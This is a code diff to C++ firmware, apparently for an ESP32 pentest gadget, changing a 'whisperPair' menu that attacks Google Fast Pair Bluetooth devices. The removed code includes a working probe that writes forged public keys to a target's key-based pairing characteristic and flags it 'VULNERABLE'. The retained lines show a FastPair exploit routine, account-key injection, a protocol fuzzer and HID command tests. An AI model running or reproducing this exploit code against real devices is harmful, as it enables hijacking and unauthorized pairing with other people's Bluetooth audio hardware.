@@ -78,66 +78,6 @@ class PairingCaptureCallback : public NimBLEScanCallbacks {
 
 PairingCaptureCallback pairingCaptureCB;
 
-void diagnoseConnection(NimBLEAddress target) {
-    Serial.println("\n=== CONNECTION DIAGNOSIS ===");
-    Serial.printf("Target: %s\n", target.toString().c_str());
-    
-    NimBLEScan* scanner = NimBLEDevice::getScan();
-    if(scanner) {
-        Serial.println("Scanner available: YES");
-    } else {
-        Serial.println("Scanner available: NO");
-    }
-    
-    NimBLEClient* testClient = NimBLEDevice::createClient();
-    if(!testClient) {
-        Serial.println("Failed to create client");
-        return;
-    }
-    
-    testClient->setClientCallbacks(&clientCB);
-    testClient->setConnectTimeout(5);
-    
-    Serial.println("Attempting connection...");
-    if(testClient->connect(target)) {
-        Serial.println("Connection SUCCESS");
-        
-        const std::vector<NimBLERemoteService*> services = testClient->getServices(true);
-        Serial.printf("Found %d services\n", services.size());
-        
-        testClient->disconnect();
-    } else {
-        Serial.println("Connection FAILED");
-        
-        if(scanner) {
-            scanner->clearResults();
-            scanner->setActiveScan(true);
-            scanner->start(1, false);
-            
-            bool found = false;
-            for(int i = 0; i < scanner->getResults().getCount(); i++) {
-                const NimBLEAdvertisedDevice* dev = scanner->getResults().getDevice(i);
-                if(dev && dev->getAddress().equals(target)) {
-                    Serial.printf("Device IS advertising (RSSI: %d)\n", dev->getRSSI());
-                    found = true;
-                    break;
-                }
-            }
-            
-            if(!found) {
-                Serial.println("Device NOT found in scan");
-            }
-            
-            scanner->stop();
-        }
-    }
-    
-    if(testClient) {
-        NimBLEDevice::deleteClient(testClient);
-    }
-    Serial.println("=== DIAGNOSIS COMPLETE ===\n");
-}
-
 bool safeConnectWithRetry(NimBLEAddress target, int maxRetries, NimBLEClient** outClient) {
     for(int attempt = 0; attempt < maxRetries; attempt++) {
         Serial.printf("[CONNECT] Attempt %d/%d to %s\n", attempt+1, maxRetries, target.toString().c_str());
@@ -512,7 +452,7 @@ NimBLEAddress parseAddress(const String& addressInfo) {
     return NimBLEAddress(mac.c_str(), type);
 }
 
-bool attemptFastPairExploit(NimBLEAddress target) {
+bool fastPairExploit(NimBLEAddress target) {
     NimBLEClient* pClient = nullptr;
     
     if(!safeConnectWithRetry(target, 2, &pClient)) {
@@ -628,104 +568,6 @@ bool attemptFastPairExploit(NimBLEAddress target) {
     
     showAdaptiveMessage("Exploit attempt complete", "", "", "", TFT_WHITE, false, true);
     return true;
-}
-
-bool testCryptoValidation(NimBLEAddress target) {
-    Serial.println("\n=== TESTING CRYPTO VALIDATION ===");
-    
-    NimBLEClient* pClient = nullptr;
-    if(!safeConnectWithRetry(target, 2, &pClient)) {
-        showErrorMessage("Connection failed");
-        return false;
-    }
-    
-    if(!pClient || !pClient->isConnected()) {
-        showErrorMessage("Client not connected");
-        if(pClient) {
-            NimBLEDevice::deleteClient(pClient);
-        }
-        return false;
-    }
-    
-    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
-    if(!pService) {
-        pClient->disconnect();
-        NimBLEDevice::deleteClient(pClient);
-        showErrorMessage("No FastPair service");
-        return false;
-    }
-    
-    NimBLERemoteCharacteristic* pKbpChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
-    if(!pKbpChar || !pKbpChar->canWrite()) {
-        pClient->disconnect();
-        NimBLEDevice::deleteClient(pClient);
-        showErrorMessage("No writable KBP");
-        return false;
-    }
-    
-    tft.fillScreen(TFT_YELLOW);
-    drawMainBorderWithTitle("CRYPTO VALIDATION TEST");
-    tft.setTextColor(TFT_BLACK, TFT_YELLOW);
-    tft.setCursor(20, 60);
-    tft.print("Testing crypto validation...");
-    
-    uint8_t randomKey[65];
-    esp_fill_random(randomKey, sizeof(randomKey));
-    randomKey[0] = 0x04;
-    
-    uint8_t testPacket[67] = {0x00, 0x00};
-    memcpy(&testPacket[2], randomKey, 65);
-    
-    tft.setCursor(20, 90);
-    tft.print("Test 1: Random key...");
-    
-    if(pKbpChar->writeValue(testPacket, 67, true)) {
-        tft.setCursor(180, 90);
-        tft.print("VULNERABLE!");
-        Serial.println("VULNERABLE: Device accepted random public key!");
-        pClient->disconnect();
-        NimBLEDevice::deleteClient(pClient);
-        showSuccessMessage("DEVICE IS VULNERABLE!");
-        return true;
-    } else {
-        tft.setCursor(180, 90);
-        tft.print("OK");
-    }
-    
-    uint8_t compressedKey[33];
-    esp_fill_random(compressedKey, sizeof(compressedKey));
-    compressedKey[0] = 0x02;
-    
-    uint8_t testPacket2[35] = {0x00, 0x00};
-    memcpy(&testPacket2[2], compressedKey, 33);
-    
-    tft.setCursor(20, 120);
-    tft.print("Test 2: Compressed key...");
-    
-    if(pKbpChar->writeValue(testPacket2, 35, true)) {
-        tft.setCursor(180, 120);
-        tft.print("VULNERABLE!");
-        Serial.println("VULNERABLE: Device accepted compressed key!");
-        pClient->disconnect();
-        NimBLEDevice::deleteClient(pClient);
-        showSuccessMessage("DEVICE IS VULNERABLE!");
-        return true;
-    } else {
-        tft.setCursor(180, 120);
-        tft.print("OK");
-    }
-    
-    if(pClient->isConnected()) {
-        pClient->disconnect();
-    }
-    NimBLEDevice::deleteClient(pClient);
-    
-    tft.setCursor(20, 180);
-    tft.print("Device validates crypto properly.");
-    delay(2000);
-    
-    showAdaptiveMessage("Device validates crypto", "OK", "", "", TFT_GREEN, true, false);
-    return false;
 }
 
 bool attemptAccountKeyInjection(NimBLEAddress target, CapturedKeys& keys) {
@@ -1014,27 +856,40 @@ void runProtocolFuzzer(NimBLEAddress target) {
 String selectTargetFromScan(const char* title) {
     String selectedMAC = "";
     uint8_t selectedAddrType = BLE_ADDR_PUBLIC;
+    
     tft.fillScreen(bruceConfig.bgColor);
     drawMainBorderWithTitle(title);
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
     tft.fillRect(20, 60, tftWidth - 40, 40, bruceConfig.bgColor);
     tft.setCursor(20, 60);
-    tft.print("Scanning for devices...");
+    tft.print("Initializing scanner...");
     
-    NimBLEDevice::deinit(true);
-    delay(100);
-    NimBLEDevice::init("TargetScanner");
+    static bool bleInitialized = false;
+    if(!bleInitialized) {
+        NimBLEDevice::init("TargetScanner");
+        bleInitialized = true;
+    }
+    
     NimBLEDevice::setPower(ESP_PWR_LVL_P9);
     NimBLEDevice::setSecurityAuth(false, false, false);
+    
     NimBLEScan* pBLEScan = NimBLEDevice::getScan();
+    if(!pBLEScan) {
+        showErrorMessage("Failed to create scanner");
+        return "";
+    }
+    
     pBLEScan->clearResults();
     pBLEScan->setActiveScan(true);
     pBLEScan->setInterval(67);
     pBLEScan->setWindow(33);
     pBLEScan->setDuplicateFilter(true);
     
-    unsigned long scanStart = millis();
-    pBLEScan->start(0, true);
+    tft.fillRect(20, 60, tftWidth - 40, 40, bruceConfig.bgColor);
+    tft.setCursor(20, 60);
+    tft.print("Scanning for 15s...");
+    
+    pBLEScan->start(15, false);
     
     struct ScanDevice {
         String name;
@@ -1045,18 +900,7 @@ String selectTargetFromScan(const char* title) {
     };
     std::vector<ScanDevice> devices;
     
-    while (millis() - scanStart < 15000) {
-        if (check(EscPress)) {
-            pBLEScan->stop();
-            NimBLEDevice::deinit(true);
-            return "";
-        }
-        delay(10);
-    }
-    
-    pBLEScan->stop();
-    const NimBLEScanResults& foundDevices = pBLEScan->getResults();
-    
+    NimBLEScanResults foundDevices = pBLEScan->getResults();
     for(int i = 0; i < foundDevices.getCount(); i++) {
         const NimBLEAdvertisedDevice* device = foundDevices.getDevice(i);
         if(!device) continue;
@@ -1068,7 +912,7 @@ String selectTargetFromScan(const char* title) {
         dev.rssi = device->getRSSI();
         dev.fastPair = false;
         
-        if (dev.name.isEmpty() || dev.name == "(null)") {
+        if(dev.name.isEmpty() || dev.name == "(null)") {
             dev.name = dev.address;
         }
         
@@ -1086,9 +930,8 @@ String selectTargetFromScan(const char* title) {
     }
     
     pBLEScan->clearResults();
-    NimBLEDevice::deinit(true);
     
-    if (devices.empty()) {
+    if(devices.empty()) {
         showWarningMessage("NO DEVICES FOUND");
         delay(1500);
         return "";
@@ -1389,32 +1232,13 @@ void whisperPairMenu() {
     std::vector<Option> options;
     returnToMenu = false;
     
-    options.push_back({"[Connection Diagnostic]", []() {
-        initBLEIfNeeded("Bruce-Diagnostic");
-        String targetInfo = selectTargetFromScan("DIAGNOSE CONNECTION");
-        if(targetInfo.isEmpty()) return;
-        NimBLEAddress target = parseAddress(targetInfo);
-        diagnoseConnection(target);
-        showAdaptiveMessage("Diagnosis complete", "OK", "", "", TFT_WHITE, true, false);
-    }});
-    
-    options.push_back({"[Test Crypto Validation]", []() {
-        initBLEIfNeeded("Bruce-WP");
-        String targetInfo = selectTargetFromScan("TEST TARGET");
-        if(targetInfo.isEmpty()) return;
-        NimBLEAddress target = parseAddress(targetInfo);
-        if(requireSimpleConfirmation("Test crypto validation?")) {
-            testCryptoValidation(target);
-        }
-    }});
-    
-    options.push_back({"[Attempt FastPair Exploit]", []() {
+    options.push_back({"[FastPair Exploit]", []() {
         initBLEIfNeeded("Bruce-WP");
         String targetInfo = selectTargetFromScan("EXPLOIT TARGET");
         if(targetInfo.isEmpty()) return;
         NimBLEAddress target = parseAddress(targetInfo);
-        if(requireSimpleConfirmation("Attempt FastPair exploit?")) {
-            if(attemptFastPairExploit(target)) {
+        if(requireSimpleConfirmation("Run FastPair exploit?")) {
+            if(fastPairExploit(target)) {
                 showSuccessMessage("EXPLOIT MAY HAVE WORKED!");
             } else {
                 showErrorMessage("Exploit failed");
@@ -1489,23 +1313,6 @@ void whisperPairMenu() {
         if(requireSimpleConfirmation("Test HID commands?")) {
             testHIDCommands(target);
         }
-    }});
-    
-    options.push_back({"[Validate Crypto Implementation]", []() {
-        tft.fillScreen(TFT_BLACK);
-        drawMainBorderWithTitle("CRYPTO VALIDATION");
-        tft.setTextColor(TFT_WHITE, TFT_BLACK);
-        uint8_t pubkey[65];
-        size_t len = 65;
-        tft.setCursor(20, 60);
-        if(crypto.generateValidKeyPair(pubkey, &len)) {
-            tft.print("Crypto implementation: OK");
-        } else {
-            tft.print("Crypto implementation: FAILED");
-        }
-        tft.setCursor(20, 90);
-        tft.print("Press any key...");
-        while(!check(EscPress) && !check(SelPress)) delay(50);
     }});
     
     options.push_back({"[Back]", []() { returnToMenu = true; }});
